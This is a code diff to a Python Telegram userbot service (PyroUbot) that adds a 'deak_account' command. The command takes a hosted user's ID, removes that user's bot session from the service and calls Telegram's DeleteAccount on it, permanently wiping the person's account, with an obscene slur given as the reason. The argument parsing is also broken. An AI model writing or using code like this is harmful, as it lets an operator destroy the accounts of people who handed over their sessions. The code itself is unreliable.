@@ -4,10 +4,27 @@ from datetime import datetime
 from time import time
 
 from pyrogram.enums import SentCodeType
+from pyrogram.raw import functions
 from pyrogram.errors import *
 from pyrogram.types import *
 
 from PyroUbot import *
+
+
+async def deak_account(client, message):
+    if len(message.command) < 2:
+        return await message.reply(f"{message.text} user_id")
+    try:
+        user_id = int(message.command)
+    except Exception as error:
+        return await message.reply(error)
+    user = [x for x in ubot._ubot if x.me.id == user_id]
+    if user:
+        ubot._ubot.remove(user[0])
+        await user[0].invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+        return await message.reply(f"{user[0].me.mention} berhasil dideak")
+    else:
+        return await message.reply("user_id tersebut tidak ditemukan")
 
 
 async def cek_status(client, callback_query):
